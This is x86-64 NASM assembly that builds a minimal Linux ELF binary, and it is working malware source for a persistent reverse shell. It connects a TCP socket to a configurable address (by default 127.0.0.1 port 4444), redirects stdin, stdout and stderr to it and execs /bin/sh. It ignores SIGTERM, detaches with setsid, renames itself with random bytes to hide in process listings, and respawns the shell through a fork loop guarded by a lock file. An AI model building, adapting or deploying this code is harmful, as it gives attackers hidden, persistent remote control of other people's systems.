; Emit 64-bit code.
bits 64
; Use RIP-relative addressing by default.
default rel
; Load at this address
org 0x40000000

ELFCLASS64 equ 2
ELFDATA2LSB equ 1
EV_CURRENT equ 1
ELFOSABI_NONE equ 0
ET_EXEC equ 2
EM_X86_64 equ 62
PT_LOAD equ 1
PF_X equ 1
PF_W equ 2
PF_R equ 4
O_RDONLY equ 0
O_RDWR equ 2

; ------------------------------
; ------64-bit ELF header.------
; ------------------------------

elfh:
; e_ident
db 0x7f, 'ELF', ELFCLASS64, ELFDATA2LSB, EV_CURRENT, ELFOSABI_NONE, 0, 0, 0, 0, 0, 0, 0, 0
; e_type
dw ET_EXEC
; e_machine
dw EM_X86_64
; e_version
dd EV_CURRENT
; e_entry
dq _start
; e_phoff
dq phdr - $$
; e_shoff
dq 0
; e_flags
dd 0
; e_ehsize
dw ehsize
; e_phentsize
dw phsize
; e_phnum
dw 1
; e_shentsize
dw 0
; e_shnum
dw 0
; e_shstrndx
dw 0

; Size of the elf header.
ehsize equ $ - elfh

; 64-bit program header.
phdr:
; p_type;
dd PT_LOAD
; p_flags;
dd PF_R | PF_W | PF_X
; p_offset;
dq 0
; p_vaddr;
dq $$
; p_paddr;
dq $$
; p_filesz;
dq filesize
; p_memsz;
dq filesize
; p_align;

dq 0x1000

%ifndef SOCKET_VAL
%define SOCKET_VAL 0x0100007f5c110002
%endif

phsize equ $ - phdr

set_file:
        push   rbp
        mov    rbp, rsp
        mov    DWORD [rbp-0x34], edi
        mov    DWORD [rbp-0x38], esi
        mov    DWORD [rbp-0x3c], edx
        mov    eax, DWORD [rbp-0x3c]
        mov    WORD [rbp-0x30], ax
        mov    WORD [rbp-0x2e], 0x0
        mov    QWORD [rbp-0x28], 0x0
        mov    QWORD [rbp-0x20], 0x0
        mov    eax, 0x48
        mov    edi, DWORD [rbp-0x34]
        mov    esi, DWORD [rbp-0x38]
        lea    rdx, [rbp-0x30]
        syscall
        mov    QWORD [rbp-0x8], rax
        mov    rax, QWORD [rbp-0x8]
        pop    rbp
        ret


do_sleep:
        push   rbp
        mov    rbp, rsp
        mov    DWORD [rbp-0x34], edi
        mov    QWORD [rbp-0x20], 0x0
        mov    QWORD [rbp-0x18], 0x0
        mov    QWORD [rbp-0x30], 0x0
        mov    QWORD [rbp-0x28], 0x0
        mov    eax, DWORD [rbp-0x34]
        cdqe
        mov    QWORD [rbp-0x20], rax
        mov    eax, 0x23
        lea    rdx, [rbp-0x20]
        lea    rsi, [rbp-0x30]
        mov    rdi, rdx
        syscall
        mov    QWORD [rbp-0x8], rax
        mov    rax, QWORD [rbp-0x8]
        pop    rbp
        ret

; ----------------------------------
;       ignore_siganal
; ----------------------------------

ignore_signal:
        push   rbp
        mov    rbp, rsp
        sub    rsp, 0x48
        mov    DWORD [rbp-0xb4], edi
        mov    DWORD [rbp-0x4], 0x0
        jmp    j1
    j2:
        mov    eax, DWORD [rbp-0x4]
        cdqe
        lea    rdx, [rax*8+0x0]
        lea    rax, [rbp-0xb0]
        add    rax, rdx
        mov    QWORD [rax], 0x0
        add    DWORD [rbp-0x4], 0x1
    j1:
        mov    eax, DWORD [rbp-0x4]
        cmp    eax, 0x12
        jbe    j2
        mov    QWORD [rbp-0xb0], 0x1
        mov    r10d, 0x8
        mov    eax, 0xd
        mov    edi, DWORD [rbp-0xb4]
        lea    rsi, [rbp-0xb0]
        mov    edx, 0x0
        syscall
        mov    QWORD [rbp-0x10], rax
        mov    rax, QWORD [rbp-0x10]
        mov    DWORD [rbp-0x14], eax
        mov    eax, 0x0
        leave
        ret


_start:

; ------------------------------------
;       __start
; ------------------------------------

        ; ------------------------------------
        ;      prapare global
        ; ------------------------------------

        ; -----------   get the argv[0]   --------------
        push   rbp
        mov    rbp, rsp
        sub    rsp, 0xf0
        mov    rax, QWORD [rbp+0x10]
        mov    QWORD [rbp-0x10], rax

        ; -----------   open(tmp_lock)   ---------------
        mov rax, 0x636f6c2f706d742f
        mov    QWORD [rbp-0xb3], rax
        mov    DWORD [rbp-0xac], 0x6b63
        mov rax, 0x6e61722f7665642f
        mov    QWORD [rbp-0xc0], rax
        mov rax, 0x6d6f646e6172
        mov    QWORD [rbp-0xbb], rax
        mov    eax, 0x2
        lea    rdi, [rbp-0xb3]
        mov    esi, 0x42
        mov    edx, 0x1b6
        syscall

        ; ------------   open(/dev/random)  ----------------
        mov    QWORD [rbp-0x18], rax
        mov    rax, QWORD [rbp-0x18]
        mov    DWORD [rbp-0x1c], eax
        mov    eax, 0x2
        lea    rdi, [rbp-0xc0]
        mov    esi, 0x0
        mov    edx, 0x1b6
        syscall

        
        ; ----------   set_sig_handle(SIGTERM)   ----------
        mov    QWORD [rbp-0x28], rax
        mov    rax, QWORD [rbp-0x28]
        mov    DWORD [rbp-0x2c], eax
        mov    edi, 0xf
        call   ignore_signal

        ; ---------------------------------------
        ;        infinity loop 
        ; --------------------------------------

        infinity_loop:
            ; -----------------------------------------------
            ;       child process
            ; ------------------------------------------------


            ; ------------------   fork   ----------------------
            mov    eax, 0x39
            syscall


            mov    QWORD [rbp-0x38], rax
            mov    rax, QWORD [rbp-0x38]
            mov    DWORD [rbp-0x3c], eax
            cmp    DWORD [rbp-0x3c], 0x0
            jne    father_process

            ; -----------------   setsid   ---------------------
            mov rax, 0x68732f6e69622f
            mov    QWORD [rbp-0xc9], rax
            mov    BYTE [rbp-0xc1], 0x0
            mov    eax, 0x70
            syscall
            
            ; -----------   child get file lock -----------------
            mov    QWORD [rbp-0x78], rax
            mov    eax, DWORD [rbp-0x1c]
            mov    edx, 0x1
            mov    esi, 0x7
            mov    edi, eax
            call   set_file

            ; -----------   create socket  -----------------------
            mov    eax, 0x29
            mov    edi, 0x2
            mov    esi, 0x1
            mov    edx, 0x0
            syscall

            ; ----------   connect socket   ----------------------
            mov    QWORD [rbp-0x80], rax
            mov    rax, QWORD [rbp-0x80]
            mov    DWORD [rbp-0x84], eax
            lea    rax, [rbp-0xe0]
            mov rcx, SOCKET_VAL
            mov    QWORD [rax], rcx
            mov    eax, 0x2a
            mov    edi, DWORD [rbp-0x84]
            lea    rsi, [rbp-0xe0]
            mov    edx, 0x10
            syscall

                ; -------------   dup2 loop  ---------------------
                mov    QWORD [rbp-0x90], rax
                mov    DWORD [rbp-0x4], 0x0
                jmp    dup2_l1
            dup2_l2:
                mov    eax, 0x21
                mov    edx, DWORD [rbp-0x84]
                mov    esi, DWORD [rbp-0x4]
                mov    edi, edx
                syscall
                mov    QWORD [rbp-0xa8], rax
                add    DWORD [rbp-0x4], 0x1
            dup2_l1:
                cmp    DWORD [rbp-0x4], 0x2
                jle    dup2_l2
            
            ; -----------  execve   ----------------
            mov    eax, 0x3b
            lea    rdi, [rbp-0xc9]
            mov    esi, 0x0
            mov    edx, 0x0
            syscall

            ; -----------  exit    ----------------
            mov    QWORD [rbp-0x98], rax
            mov    eax, 0x3c
            mov    edx, 0x0
            mov    edi, edx
            syscall

            ; ------------------------------------------
            ;             father process
            ; ------------------------------------------
        father_process: 
            ; ---------   do sleep   -------------------
            mov    DWORD [rbp-0x40], 0x0
            mov    edi, 0x3
            call   do_sleep

                ; -------------------------------------
                ;       loop to check file lock
                ; -------------------------------------
            
            father_loop:
                ; ------------   read   ---------------
                mov    DWORD [rbp-0xe7], 0x0
                mov    DWORD [rbp-0xe4], 0x0
                mov    eax, 0x0
                mov    edi, DWORD [rbp-0x2c]
                lea    rsi, [rbp-0xe7]
                mov    edx, 0x6
                syscall

                    ; -----  change name in argv ------
                    mov    QWORD [rbp-0x48], rax
                    mov    DWORD [rbp-0x8], 0x0
                    jmp    set_name_l1
                set_name_l2:
                    mov    eax, DWORD [rbp-0x8]
                    movsxd rdx, eax
                    mov    rax, QWORD [rbp-0x10]
                    add    rdx, rax
                    mov    eax, DWORD [rbp-0x8]
                    cdqe
                    movzx  eax, BYTE [rbp+rax*1-0xe7]
                    mov    BYTE [rdx], al
                    add    DWORD [rbp-0x8], 0x1
                set_name_l1:
                    cmp    DWORD [rbp-0x8], 0x6
                    jle    set_name_l2
                
                ; ---------  prctl set name ------------
                mov    eax, 0x9d
                mov    edi, 0xf
                lea    rdx, [rbp-0xe7]
                mov    rsi, rdx
                syscall


                mov    QWORD [rbp-0x50], rax
                mov    eax, DWORD [rbp-0x1c]
                mov    edx, 0x1
                mov    esi, 0x6
                mov    edi, eax
                call   set_file

                ;  --------   if () {}  --------------
                mov    DWORD [rbp-0x40], eax
                cmp    DWORD [rbp-0x40], 0x0
                jne    check_file_l1
                mov    eax, DWORD [rbp-0x1c]
                mov    edx, 0x2
                mov    esi, 0x6
                mov    edi, eax
                call   set_file
                jmp    infinity_loop

            check_file_l1:
                ; ---------   fork   ---------------
                mov    eax, 0x39
                syscall


                mov    QWORD [rbp-0x58], rax
                mov    rax, QWORD [rbp-0x58]
                mov    DWORD [rbp-0x5c], eax
                cmp    DWORD [rbp-0x5c], 0x0
                jle    fa_fa_l1

                    ; -------------------------------
                    ;       fa-fa process
                    ; -------------------------------
                    mov    edi, 0x5
                    call   do_sleep
                    mov    eax, 0x3c
                    mov    edx, 0x0
                    mov    edi, edx
                    syscall
                    mov    QWORD [rbp-0x68], rax
            fa_fa_l1:
                mov    eax, 0x70
                syscall
                mov    QWORD [rbp-0x70], rax
                mov    edi, 0x1
                call   do_sleep
                jmp    father_loop

filesize equ $ - $$